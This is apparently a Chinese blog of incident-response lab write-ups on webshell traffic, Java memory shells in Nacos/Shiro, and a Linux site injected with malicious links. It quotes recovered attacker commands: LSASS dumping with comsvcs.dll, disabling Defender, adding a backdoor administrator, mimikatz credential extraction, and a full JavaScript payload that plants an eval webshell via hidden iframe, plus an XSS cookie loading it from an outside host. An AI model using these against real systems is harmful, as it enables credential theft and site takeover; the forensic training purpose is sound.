<h1 id="DAY12"><a href="#DAY12" class="headerlink" title="DAY12"></a>DAY12</h1><h2 id="第六章-流量特征分析-蚂蚁爱上树"><a href="#第六章-流量特征分析-蚂蚁爱上树" class="headerlink" title="第六章 流量特征分析-蚂蚁爱上树"></a>第六章 流量特征分析-蚂蚁爱上树</h2><h3 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 管理员Admin账号的密码是什么？</span><br><span class="line">2. LSASS.exe的程序进程ID是多少？</span><br><span class="line">3. 用户WIN101的密码是什么?</span><br></pre></td></tr></table></figure>

<h4 id="1-管理员Admin账号的密码是什么？"><a href="#1-管理员Admin账号的密码是什么？" class="headerlink" title="1. 管理员Admin账号的密码是什么？"></a>1. 管理员Admin账号的密码是什么？</h4><p>大概浏览了一下流量包，差不多攻击者后面是有传shell进去然后进行RCE的</p>
<p>这里要找Admin账号的密码，可以在流量包搜索admin发现基本都是出现在onlineshop&#x2F;product2.php里面</p>
<p>这个product2.php就是攻击者上传的shell,我们再去搜索onlineshop&#x2F;product2.php</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b2bc446c.png" alt="1754467093754.png"></p>
<p>有多个这样的onlineshop&#x2F;product2.php我们对他们的shell按照给的加密逻辑逐个解密</p>
<p>执行命令的解密就是去掉前两个字符然后base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">C:/phpStudy/PHPTutorial/WWW/onlineshop/database/onlineshop.sql</span><br><span class="line">cd /d “C:/phpStudy/PHPTutorial/WWW/onlineshop”&amp;ls&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;whoami /priv&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;systeminfo&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net user&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net localgroup administrators&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net group “domain group” /domain&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net group “domain admins” /domain&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net view&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net share&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;rundll32.exe comsvcs.dll, MiniDump 852</span><br><span class="line">C:\Temp\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;ls&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;copy store.php c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;powershell -ep bypass Set-Mppreference -DisableRaltimeMonitoring $true&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\temp\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">C:/Temp/OnlineShopBack.zip</span><br><span class="line">cd /d “C:/phpStudy/PHPTutorial/WWW/onlineshop”&amp;dir c:\windows\system32&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:\windows\config&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net user&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net user admin Password1 /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net localgroup administrators admin /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;whoami /all&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>



<p><img src="https://free.picui.cn/free/2025/08/06/68930b2c42949.png" alt="1754467093755.png"></p>
<p>终于找到了</p>
<p>password1就是为admin新设置的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Y2QgL2QgIkM6XFxwaHBTdHVkeVxcUEhQVHV0b3JpYWxcXFdXV1xcb25saW5lc2hvcCImbmV0IHVzZXIgYWRtaW4gUGFzc3dvcmQxIC9hZGQmZWNobyBbU10mY2QmZWNobyBbRV0</span><br><span class="line"></span><br><span class="line">cd /d &quot;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&quot;&amp;net user admin Password1 /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>

<h4 id="2-LSASS-exe的程序进程ID是多少？"><a href="#2-LSASS-exe的程序进程ID是多少？" class="headerlink" title="2. LSASS.exe的程序进程ID是多少？"></a>2. LSASS.exe的程序进程ID是多少？</h4><p>重点看到这里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe comsvcs.dll, MiniDump 852  C:\Temp\OnlineShopBackup.zip full</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe 调用comsvcs.dll库的MiniDump函数把 852进程转存道C:\Temp\OnlineShopBackup.zip</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MiniDump函数，通常指的是在Windows操作系统中，用于生成小型内存转储（minidump）文件的函数。这些文件包含了程序崩溃时的关键信息，如程序的执行环境、寄存器状态、调用堆栈以及内存中重要区域的内容以及这些文件包含了系统内存的快照，可能包括敏感信息。</span><br></pre></td></tr></table></figure>

<p>所以可以猜测这里的852就是LSASS.exe的进程id</p>
<h4 id="3-用户WIN101的密码是什么"><a href="#3-用户WIN101的密码是什么" class="headerlink" title="3. 用户WIN101的密码是什么?"></a>3. 用户WIN101的密码是什么?</h4><p>因为这里我们知道转存到OnlineShopBackup.zip，我们得把这个导出来,具体文件内容有在响应包体现，导出http，去除多余字符,修改后缀为dmp在用mimikatz抓取密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::minidump product2.dmp</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">!管理员模式打开</span><br></pre></td></tr></table></figure>

<p>就是NTLM md5解密</p>
<p>之前一直用的一个要收费了换了一个</p>
<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM：NT LAN Manager的缩写，是一种网络认证协议，用于在Windows网络上进行用户认证。这里的282d975e35846022476068ab5a3d72df是用户名win101在VULNTARGET域下经过NTLM哈希算法处理后的密码哈希值。</span><br></pre></td></tr></table></figure>

<p><img src="https://free.picui.cn/free/2025/08/06/68930b2d23ebd.png" alt="1754467093755.png"></p>
<h1 id="DAY13"><a href="#DAY13" class="headerlink" title="DAY13"></a>DAY13</h1><h2 id="第八章-内存马分析-java01-nacos"><a href="#第八章-内存马分析-java01-nacos" class="headerlink" title="第八章 内存马分析-java01-nacos"></a>第八章 内存马分析-java01-nacos</h2><h3 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">问题 1 nacos 用户密码的密文值作为 flag 提交 flag&#123;密文&#125;</span><br><span class="line">问题 2 shiro 的key为多少  shiro 的 key 请记录下来 （备注请记录下，可能有用）</span><br><span class="line">问题 3 靶机内核版本为 flag&#123;&#125;</span><br><span class="line">问题 4 尝试应急分析，运行 get_flag 然后尝试 check_flag 通过后提交 flag</span><br><span class="line">问题 5 尝试修复 nacos 并且自行用 poc 测试是否成功</span><br></pre></td></tr></table></figure>

<h4 id="问题-1-nacos-用户密码的密文值作为-flag-提交-flag-密文"><a href="#问题-1-nacos-用户密码的密文值作为-flag-提交-flag-密文" class="headerlink" title="问题 1 nacos 用户密码的密文值作为 flag 提交 flag{密文}"></a>问题 1 nacos 用户密码的密文值作为 flag 提交 flag{密文}</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nacos是一个功能强大且易于使用的动态服务发现、配置管理和服务管理平台，它能够帮助开发者轻松管理和监控分布式系统中的服务实例，提高系统的可靠性和可扩展性</span><br></pre></td></tr></table></figure>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b2e455cb.png" alt="1754467093755.png"></p>
<p>看数据库配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/local/nacos/conf/nacos-mysql.sql</span><br></pre></td></tr></table></figure>

<p><img src="https://free.picui.cn/free/2025/08/06/68930b2e782d7.png" alt="1754467093755.png"></p>
<h4 id="问题-2-shiro-的key为多少-shiro-的-key-请记录下来-（备注请记录下，可能有用）"><a href="#问题-2-shiro-的key为多少-shiro-的-key-请记录下来-（备注请记录下，可能有用）" class="headerlink" title="问题 2 shiro 的key为多少  shiro 的 key 请记录下来 （备注请记录下，可能有用）"></a>问题 2 shiro 的key为多少  shiro 的 key 请记录下来 （备注请记录下，可能有用）</h4><p>在nacos目录下有个nacos_config_export_20231206050259.zip下载到本地搜索shiro找到</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b2fbeff4.png" alt="1754467093755.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件是一个yaml格式的配置文件是基于Spring框架的应用程序</span><br></pre></td></tr></table></figure>

<h4 id="问题-3-靶机内核版本为-flag"><a href="#问题-3-靶机内核版本为-flag" class="headerlink" title="问题 3 靶机内核版本为 flag{}"></a>问题 3 靶机内核版本为 flag{}</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Linux内核版本查看方法</span><br><span class="line">使用uname命令</span><br><span class="line">uname -r：直接显示当前内核版本号。</span><br><span class="line">uname -a：显示包括内核版本在内的系统详细信息。</span><br><span class="line"></span><br><span class="line">查看/proc/version文件</span><br><span class="line">cat /proc/version：显示内核版本、GCC编译器版本等详细信息。</span><br><span class="line"></span><br><span class="line">使用dmesg命令</span><br><span class="line">dmesg | grep &#x27;Linux version&#x27;：从内核消息缓冲区中过滤出内核版本信息。</span><br><span class="line"></span><br><span class="line">使用hostnamectl命令</span><br><span class="line">hostnamectl：显示系统主机名、Linux发行版和内核版本等信息。</span><br><span class="line">hostnamectl | grep Kernel：仅显示内核版本信息。</span><br><span class="line"></span><br><span class="line">查看发行版特定的文件</span><br><span class="line">cat /etc/os-release：某些发行版包含内核版本信息。</span><br><span class="line">cat /etc/lsb-release：类似地，显示发行版和内核信息（如果文件存在）。</span><br><span class="line">cat /etc/*release 或 cat /etc/*-release：尝试查找包含“release”的文件。</span><br><span class="line"></span><br><span class="line">使用包管理器查询</span><br><span class="line">RPM系统（如CentOS、Fedora）：rpm -q kernel 显示已安装的内核包版本。</span><br><span class="line">Debian系统（如Ubuntu）：dpkg -l linux-image-* 列出所有已安装的Linux内核包，当前使用的内核版本通常会有特殊标记。</span><br><span class="line">这些方法是查看Linux内核版本的常用且有效的方式。根据具体需求和系统环境，可以选择最适合的方法。</span><br></pre></td></tr></table></figure>

<h4 id="问题-4-尝试应急分析，运行-get-flag-然后尝试-check-flag-通过后提交-flag"><a href="#问题-4-尝试应急分析，运行-get-flag-然后尝试-check-flag-通过后提交-flag" class="headerlink" title="问题 4 尝试应急分析，运行 get_flag 然后尝试 check_flag 通过后提交 flag"></a>问题 4 尝试应急分析，运行 get_flag 然后尝试 check_flag 通过后提交 flag</h4><p>找到get_flag在哪里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@vulntarget:~# find / -name get_flag</span><br><span class="line">/home/vulntarget/get_flag</span><br></pre></td></tr></table></figure>

<p><img src="https://free.picui.cn/free/2025/08/06/68930b2ff231e.png" alt="1754467093755.png"></p>
<p>这里显示应急失败,证明还存在问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat \etc\passwd</span><br></pre></td></tr></table></figure>

<p>看到存在后门用户bt</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b30b136b.png" alt="1754467093755.png"></p>
<p>把他删掉，删除得时候显示进程1在用，直接把这个进程删了就好了</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b30bde57.png" alt="1754467093755.png"></p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b3202cda.png" alt="1754467093755.png"></p>
<p>还没有完成</p>
<p>删除并运行</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b322b322.png" alt="1754467093756.png"></p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b329b809.png" alt="1754467093756.png"></p>
<h4 id="问题-5-尝试修复-nacos-并且自行用-poc-测试是否成功"><a href="#问题-5-尝试修复-nacos-并且自行用-poc-测试是否成功" class="headerlink" title="问题 5 尝试修复 nacos 并且自行用 poc 测试是否成功"></a>问题 5 尝试修复 nacos 并且自行用 poc 测试是否成功</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">说实话没太明白</span><br></pre></td></tr></table></figure>

<h2 id="第八章-内存马分析-java02-shiro"><a href="#第八章-内存马分析-java02-shiro" class="headerlink" title="第八章 内存马分析-java02-shiro"></a>第八章 内存马分析-java02-shiro</h2><h3 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.将 shiro 的 key 作为 flag 提交</span><br><span class="line">2.隐藏用户后删除，并将隐藏用户名作为 flag 提交</span><br><span class="line">3.分析app.jar文件是否存在后门，并把后门路由名称作为 flag 提交 &lt;flag&#123;/manager&#125;&gt;</span><br><span class="line">4.分析app.jar文件，将后门的密码作为 flag 提交</span><br></pre></td></tr></table></figure>

<h4 id="1-将-shiro-的-key-作为-flag-提交"><a href="#1-将-shiro-的-key-作为-flag-提交" class="headerlink" title="1.将 shiro 的 key 作为 flag 提交"></a>1.将 shiro 的 key 作为 flag 提交</h4><p>java1找到得shirokey</p>
<h4 id="2-隐藏用户后删除，并将隐藏用户名作为-flag-提交"><a href="#2-隐藏用户后删除，并将隐藏用户名作为-flag-提交" class="headerlink" title="2.隐藏用户后删除，并将隐藏用户名作为 flag 提交"></a>2.隐藏用户后删除，并将隐藏用户名作为 flag 提交</h4><p>fscan扫描开放端口</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b337591c.png" alt="1754467093756.png"></p>
<p>访问8088是一个登录界面</p>
<p>利用得到得shirokey</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b33ecda4.png" alt="1754467093756.png"></p>
<h4 id="3-分析app-jar文件是否存在后门，并把后门路由名称作为-flag-提交"><a href="#3-分析app-jar文件是否存在后门，并把后门路由名称作为-flag-提交" class="headerlink" title="3.分析app.jar文件是否存在后门，并把后门路由名称作为 flag 提交 &lt;flag{&#x2F;manager}&gt;"></a>3.分析app.jar文件是否存在后门，并把后门路由名称作为 flag 提交 &lt;flag{&#x2F;manager}&gt;</h4><p>要分析她，我们得把这个文件拿出来，打一个内存马进去</p>
<p>通过蚁剑把app.jar下载下来，jdax反编译后看到</p>
<p>这里就是后门</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b341554e.png" alt="1754467093756.png"></p>
<p>路径&#x2F;exec</p>
<h4 id="4-分析app-jar文件，将后门的密码作为-flag-提交"><a href="#4-分析app-jar文件，将后门的密码作为-flag-提交" class="headerlink" title="4.分析app.jar文件，将后门的密码作为 flag 提交"></a>4.分析app.jar文件，将后门的密码作为 flag 提交</h4><p>这里是接受一个cmd的参数，所以密码是cmd</p>
<p>验证</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b34e18d1.png" alt="1754467093756.png"></p>
<h1 id="DAY14"><a href="#DAY14" class="headerlink" title="DAY14"></a>DAY14</h1><h2 id="第五章-linux实战-黑链"><a href="#第五章-linux实战-黑链" class="headerlink" title="第五章 linux实战-黑链"></a>第五章 linux实战-黑链</h2><h3 id="解题过程-9"><a href="#解题过程-9" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">找到黑链添加在哪个文件 flag 格式 flag&#123;xxx.xxx&#125;</span><br><span class="line">webshell的绝对路径 flag&#123;xxxx/xxx/xxx/xxx/&#125;</span><br><span class="line">黑客注入黑链文件的 md5 md5sum file flag&#123;md5&#125;</span><br><span class="line">攻击入口是哪里？url请求路径，最后面加/ flag&#123;/xxxx.xxx/xxxx/x/&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到黑链添加在哪个文件-flag-格式-flag-xxx-xxx"><a href="#找到黑链添加在哪个文件-flag-格式-flag-xxx-xxx" class="headerlink" title="找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}"></a>找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑链是指恶意网站或者恶意软件在其他网站上插入的恶意链接。这些链接通常会将用户重定向到恶意网站，从而导致用户的计算机感染病毒、遭受钓鱼攻击或者泄露个人信息。</span><br></pre></td></tr></table></figure>

<p>题目帮我们打包好了<a target="_blank" rel="noopener" href="http://www.tar直接下载下来解压,但是做了很多排查都没找到,后面直接搜索的黑链找到的/">www.tar直接下载下来解压,但是做了很多排查都没找到,后面直接搜索的黑链找到的</a></p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b36a7934.png" alt="1754467093756.png"></p>
<p>但是看别人的wp虽然也是找的，但是用了grep命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rnw &#x27;/var/www/html/&#x27; -e &#x27;黑链&#x27;</span><br><span class="line">  -r：递归搜索。这个选项告诉 grep 在指定目录下的所有子目录中进行搜索</span><br><span class="line">  -n：显示行号。这个选项会在匹配的行前面显示行号，方便定位</span><br><span class="line">  -w：匹配整个单词。这个选项告诉 grep 只匹配整个单词（即匹配边界）。在这里，黑链 被视为一个完整的单词，只有当它作为一个独立的单词出现时才会被匹配</span><br><span class="line">  -e &#x27;黑链&#x27;：指定要搜索的字符串。在这个例子中，我们要搜索的是包含 黑链 字符串的所有文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="webshell的绝对路径-flag-xxxx-xxx-xxx-xxx"><a href="#webshell的绝对路径-flag-xxxx-xxx-xxx-xxx" class="headerlink" title="webshell的绝对路径 flag{xxxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;}"></a>webshell的绝对路径 flag{xxxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;}</h4><p>直接D盾扫描找到后门404.php</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b393bf5f.png" alt="1754467093756.png"></p>
<h4 id="黑客注入黑链文件的-md5-md5sum-file-flag-md5"><a href="#黑客注入黑链文件的-md5-md5sum-file-flag-md5" class="headerlink" title="黑客注入黑链文件的 md5 md5sum file flag{md5}"></a>黑客注入黑链文件的 md5 md5sum file flag{md5}</h4><p>在第二问的时候我们还扫出来了一个poc1.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// 定义一个函数，在网页末尾插入一个iframe元素</span><br><span class="line">function insertIframe() &#123;</span><br><span class="line">    // 获取当前页面路径</span><br><span class="line">    var urlWithoutDomain = window.location.pathname;</span><br><span class="line">    // 判断页面是否为评论管理页面</span><br><span class="line">    var hasManageComments = urlWithoutDomain.includes(&quot;manage-comments.php&quot;);</span><br><span class="line">    var tSrc=&#x27;&#x27;;</span><br><span class="line">    if (hasManageComments)&#123;</span><br><span class="line">        // 如果是，则将路径修改为用于修改主题文件的页面地址</span><br><span class="line">        tSrc=urlWithoutDomain.replace(&#x27;manage-comments.php&#x27;,&#x27;theme-editor.php?theme=default&amp;file=404.php&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        // 如果不是，则直接使用主题文件修改页面地址</span><br><span class="line">        tSrc=&#x27;/admin/theme-editor.php?theme=default&amp;file=404.php&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    // 定义iframe元素的属性，包括id、src、width、height和onload事件</span><br><span class="line"> </span><br><span class="line">    var iframeAttributes = &quot;&lt;iframe id=&#x27;theme_id&#x27; src=&#x27;&quot;+tSrc+&quot;&#x27; width=&#x27;0%&#x27; height=&#x27;0%&#x27; onload=&#x27;writeShell()&#x27;&gt;&lt;/iframe&gt;&quot;;</span><br><span class="line">    // 获取网页原始内容</span><br><span class="line">    var originalContent = document.body.innerHTML;</span><br><span class="line">    // 在网页末尾添加iframe元素</span><br><span class="line">    document.body.innerHTML = (originalContent + iframeAttributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 定义一个全局变量isSaved，初始值为false</span><br><span class="line">var isSaved = false;</span><br><span class="line"></span><br><span class="line">// 定义一个函数，在iframe中写入一段PHP代码并保存</span><br><span class="line">function writeShell() &#123;</span><br><span class="line">    // 如果isSaved为false</span><br><span class="line">    if (!isSaved) &#123; </span><br><span class="line">        // 获取iframe内的内容区域和“保存文件”按钮元素</span><br><span class="line">        var content = document.getElementById(&#x27;theme_id&#x27;).contentWindow.document.getElementById(&#x27;content&#x27;);</span><br><span class="line">        var btns = document.getElementById(&#x27;theme_id&#x27;).contentWindow.document.getElementsByTagName(&#x27;button&#x27;);    </span><br><span class="line">        // 获取模板文件原始内容</span><br><span class="line">        var oldData = content.value;</span><br><span class="line">        // 在原始内容前加入一段phpinfo代码</span><br><span class="line">        content.value = (&#x27;&lt;?php @eval($_POST[a]); ?&gt;\n&#x27;) + oldData;</span><br><span class="line">        // 点击“保存文件”按钮</span><br><span class="line">        btns[1].click();</span><br><span class="line">        // 将isSaved设为true，表示已经完成写入操作</span><br><span class="line">        isSaved = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 调用insertIframe函数，向网页中添加iframe元素和写入PHP代码的事件</span><br><span class="line">insertIframe();</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    ***这里可以看到设置了隐藏的iframe</span><br><span class="line">    var iframeAttributes = &quot;&lt;iframe id=&#x27;theme_id&#x27; src=&#x27;&quot;+tSrc+&quot;&#x27; width=&#x27;0%&#x27; height=&#x27;0%&#x27; onload=&#x27;writeShell()&#x27;&gt;&lt;/iframe&gt;&quot;;</span><br><span class="line">代码中的writeShell函数会在iframe加载完成后，尝试访问iframe内部的内容区域和按钮元素。然后，它会在内容区域的前面插入一段PHP代码（&lt;?php @eval($_POST[a]); ?&gt;）</span><br><span class="line">可以判断他就是黑链文件</span><br></pre></td></tr></table></figure>

<h4 id="攻击入口是哪里？url请求路径，最后面加-flag-xxxx-xxx-xxxx-x"><a href="#攻击入口是哪里？url请求路径，最后面加-flag-xxxx-xxx-xxxx-x" class="headerlink" title="攻击入口是哪里？url请求路径，最后面加&#x2F; flag{&#x2F;xxxx.xxx&#x2F;xxxx&#x2F;x&#x2F;}"></a>攻击入口是哪里？url请求路径，最后面加&#x2F; flag{&#x2F;xxxx.xxx&#x2F;xxxx&#x2F;x&#x2F;}</h4><p><img src="https://free.picui.cn/free/2025/08/06/68930b39a54dd.png" alt="1754467093757.png"></p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b39b54b1.png" alt="1754467093757.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 09f1f9758c26c309477b55f3a4bac8de__typecho_remember_author=haha; 09f1f9758c26c309477b55f3a4bac8de__typecho_remember_mail=haha@haha.com; 09f1f9758c26c309477b55f3a4bac8de__typecho_remember_url=http://xxx.xxx.com/&quot;&gt;&lt;/a&gt;&lt;script/src=http://192.168.20.130/poc1.js&gt;&lt;/script&gt;&lt;a/href=&quot;#</span><br></pre></td></tr></table></figure>

